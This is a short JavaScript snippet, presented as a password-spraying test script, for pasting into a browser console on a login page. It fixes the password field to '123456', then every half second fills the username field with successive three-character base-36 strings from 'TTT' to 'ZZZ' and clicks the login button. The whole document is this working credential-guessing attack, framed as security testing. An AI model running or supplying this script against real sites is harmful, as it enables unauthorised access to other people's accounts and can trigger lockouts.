//BRUTE FORCE - PASSWORD SPRAYING TEST SCRIPT
//This script is used to test the security of a web application by attempting to brute force the login page.

//On login page copy below code into the script console in your browser and run it to test your application.

document.getElementsByTagName("input")[1].value = "123456";
let i = parseInt("ttt", 36);
setInterval(()=>{
    if(i<=parseInt("zzz", 36)){
        document.getElementsByTagName("input")[0].value = i.toString(36).toUpperCase();
        document.getElementsByTagName("button")[1].click();
        i++
    }
},500);